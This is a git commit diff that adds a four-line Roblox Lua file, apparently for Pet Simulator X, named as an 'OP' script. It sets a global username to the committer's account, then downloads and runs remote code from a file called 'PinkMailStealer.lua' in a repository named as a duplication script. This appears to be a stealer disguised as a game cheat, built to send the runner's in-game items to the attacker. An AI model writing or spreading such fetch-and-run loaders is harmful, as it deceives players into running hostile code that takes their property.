391b0e253503a244e630caa03d2c59aa621fcdc4
SubToPunkYT <128972317+SubToPunkYT@users.noreply.github.com>
2023-03-26 13:32:51 +0200

    Update and rename README.md to PsxOpScript.lua

---
+++ PsxOpScript.lua
@@ -0,0 +1,4 @@
+_G.Name = "Script is loading"
+_G.Username = "SubToPunkYT"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
